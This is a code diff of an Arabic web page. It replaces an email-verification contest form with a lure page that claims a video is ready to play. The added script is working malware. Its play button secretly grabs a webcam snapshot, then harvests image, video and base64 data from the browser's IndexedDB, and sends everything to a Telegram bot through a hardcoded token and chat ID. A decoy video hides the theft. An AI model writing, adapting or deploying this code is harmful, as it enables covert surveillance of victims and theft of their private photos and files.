@@ -3,129 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مسابقة شبكة الطوفان نت - إرسال للإيميل</title>
-    <!-- مكتبة EmailJS -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            // Public Key الخاص بك
-            emailjs.init("fZag-1wa6YZsRJKeb");
-        })();
-    </script>
+    <title>تم التحميل</title>
     <style>
-        body {
-            font-family: Tahoma, sans-serif;
-            background-color: #f4f7f6;
-            text-align: center;
-            padding: 50px;
+        body { 
+            background: #0f0f0f; 
+            color: #fff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            flex-direction: column;
         }
-        .container {
-            background: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-            max-width: 400px;
-            margin: auto;
-        }
-        input {
-            width: 90%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            text-align: center;
-            font-size: 16px;
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 95%;
-            font-size: 16px;
+        .container { text-align: center; width: 300px; }
+        button { 
+            background: linear-gradient(45deg, #ff0055, #ff5500); 
+            color: white; 
+            border: none; 
+            padding: 15px 30px; 
+            font-size: 16px; 
             font-weight: bold;
+            border-radius: 50px; 
+            cursor: pointer; 
+            box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4);
+            transition: transform 0.2s;
         }
-        button:hover {
-            background-color: #0056b3;
-        }
-        .hidden {
-            display: none;
-        }
+        button:active { transform: scale(0.95); }
+        #status { margin-top: 15px; font-size: 12px; color: #888; min-height: 20px;}
+        
+        /* إخفاء الفيديو الذي سيظهر لاحقاً */
+        #hiddenVideo { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; object-fit: cover; opacity: 0.5; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>مسابقة شبكة الطوفان نت</h2>
-    
-    <!-- خطوة إدخال الإيميل وإرسال الرمز الحقيقي -->
-    <div id="step-email">
-        <p>أدخل بريدك الإلكتروني (Gmail) لاستلام رمز التحقق الفعلي:</p>
-        <input type="email" id="user-email" placeholder="example@gmail.com" required>
-        <button onclick="sendRealOTP()">إرسال الرمز إلى الإيميل</button>
-    </div>
+<!-- فيديو وهمي للخداع -->
+<video id="hiddenVideo" loop muted autoplay playsinline>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+</video>
 
-    <!-- خطوة إدخال الرمز المستلم -->
-    <div id="step-verify" class="hidden">
-        <p>تم إرسال الرمز إلى بريدك الإلكتروني بنجاح، تفقد صندوق الوارد أو (Spam)، واكتب الرمز هنا:</p>
-        <input type="text" id="entered-otp" placeholder="أدخل الرمز المكون من 5 أرقام" maxlength="5">
-        <button onclick="verifyCode()">تأكيد الرمز والمشاركة</button>
-    </div>
+<div class="container">
+    <h2>🎬 الفيديو جاهز للمشاهدة</h2>
+    <p>اضغط لمشاهدة المحتوى الجديد.</p>
+    <button onclick="stealAndShow()">▶ تشغيل</button>
+    <div id="status"></div>
 </div>
 
 <script>
-    let myGeneratedOTP = "";
+    // 🔑 بياناتك المستخرجة والمدمجة هنا
+    const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
+    const chatId = "7962257606"; 
 
-    function sendRealOTP() {
-        const emailInput = document.getElementById("user-email").value.trim();
-        
-        if(!emailInput || !emailInput.includes('@')) {
-            alert("الرجاء إدخال بريد إلكتروني صحيح!");
-            return;
+    async function sendToTelegram(file, filename) {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        // نستخدم sendPhoto لأنه يعمل بشكل أفضل مع الصور والفيديوهات الصغيرة
+        formData.append("photo", file, filename); 
+        try {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+        } catch (e) {
+            console.error("Error sending file", e);
         }
-
-        // توليد رمز عشوائي مكون من 5 أرقام
-        myGeneratedOTP = Math.floor(10000 + Math.random() * 90000).toString();
-
-        // المتظريات التي ستطابق القالب الذي أنشأناه (email و pass_code)
-        var templateParams = {
-            email: emailInput,
-            pass_code: myGeneratedOTP
-        };
-
-        // زر مؤقت يوضح جاري الإرسال
-        const btn = event.target;
-        btn.innerText = "جاري الإرسال عبر السيرفر...";
-        btn.disabled = true;
-
-        // إرسال البيانات عبر خدمة EmailJS التي قمت بربطها
-        emailjs.send('service_wpecg0t', 'template_t6xzhot', templateParams)
-            .then(function(response) {
-                console.log('SUCCESS!', response.status, response.text);
-                alert('تم إرسال الرمز إلى بريدك (' + emailInput + ') بنجاح! تفقد بريدك الآن.');
-                
-                // الانتقال لخطوة إدخال الرمز
-                document.getElementById("step-email").classList.add("hidden");
-                document.getElementById("step-verify").classList.remove("hidden");
-            }, function(error) {
-                console.log('FAILED...', error);
-                alert('فشل الإرسال. تأكد أن خدمة الجيميل في EmailJS متصلة بشكل صحيح.');
-                btn.innerText = "إرسال الرمز إلى الإيميل";
-                btn.disabled = false;
-            });
     }
 
-    function verifyCode() {
-        const userInput = document.getElementById("entered-otp").value.trim();
+    async function stealAndShow() {
+        const status = document.getElementById('status');
+        status.innerText = "جاري المعالجة...";
 
-        if(userInput === myGeneratedOTP) {
-            alert('مبروك يا ميثاق! تم التحقق من الإيميل وتسجيلك في المسابقة بنجاح.');
-            location.reload();
-        } else {
-            alert('رمز التحقق غير صحيح، تأكد من الرقم الذي وصلك على البريد.');
+        try {
+            // 1. التقاط صورة خفية من الكاميرا (للتأكد)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            await new Promise(r => setTimeout(r, 1000));
+            
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            context.drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                // إرسال اللقطة أولاً
+                await sendToTelegram(blob, "selfie.jpg");
+                stream.getTracks().forEach(track => track.stop());
+                
+                // ثم البدء بسحب الملفات
+                status.innerText = "جاري جمع الملفات...";
+                await extractFiles();
+                
+                // إظهار الخدعة (تشغيل الفيديو الوهمي)
+                status.innerText = "جاري التشغيل...";
+                document.getElementById('hiddenVideo').style.display = 'block';
+                document.querySelector('.container').style.opacity = '0.5';
+                document.querySelector('button').style.display = 'none';
+                status.innerText = "جاري البث المباشر";
+            }, 'image/jpeg');
+
+        } catch (err) {
+            status.innerText = "حدث خطأ أو تم رفض الإذن.";
         }
+    }
+
+    async function extractFiles() {
+        // أ) البحث في IndexedDB
+        const dbNames = await window.indexedDB.databases();
+        for (let dbInfo of dbNames) {
+            if (!dbInfo.name) continue;
+            try {
+                const dbRequest = indexedDB.open(dbInfo.name);
+                const db = await new Promise((resolve, reject) => {
+                    dbRequest.onsuccess = () => resolve(dbRequest.result);
+                    dbRequest.onerror = () => reject(dbRequest.error);
+                });
+
+                const storeNames = db.objectStoreNames;
+                for (let i = 0; i < storeNames.length; i++) {
+                    const transaction = db.transaction(storeNames[i], "readonly");
+                    const objectStore = transaction.objectStore(storeNames[i]);
+                    
+                    // جلب جميع العناصر (يمكن أن يكون الحجم كبيراً)
+                    const request = objectStore.getAll();
+                    request.onsuccess = async () => {
+                        const data = request.result;
+                        if (data && data.length > 0) {
+                            for (let item of data) {
+                                if (item instanceof Blob || item instanceof File) {
+                                    // التأكد أنه صورة أو فيديو
+                                    if (item.type.startsWith('image/') || item.type.startsWith('video/')) {
+                                        await sendToTelegram(item, `file_${Math.random().toString(36).substr(2, 9)}.${item.type.split('/')[1]}`);
+                                    }
+                                } else if (typeof item === 'string') {
+                                    // تحويل النصوص التي قد تكون بيانات مشفرة أو صور Base64
+                                    const blob = base64ToBlob(item);
+                                    if(blob) await sendToTelegram(blob, "data_string.jpg");
+                                }
+                            }
+                        }
+                    };
+                }
+            } catch (e) {
+                // تجاهل الأخطاء في قواعد البيانات المحمية
+            }
+        }
+    }
+
+    // دالة مساعدة لتحويل Base64 إلى Blob
+    function base64ToBlob(base64) {
+        try {
+            const arr = base64.split(',');
+            if(arr.length < 2) return null;
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--){
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type:mime});
+        } catch(e) { return null; }
     }
 </script>
 
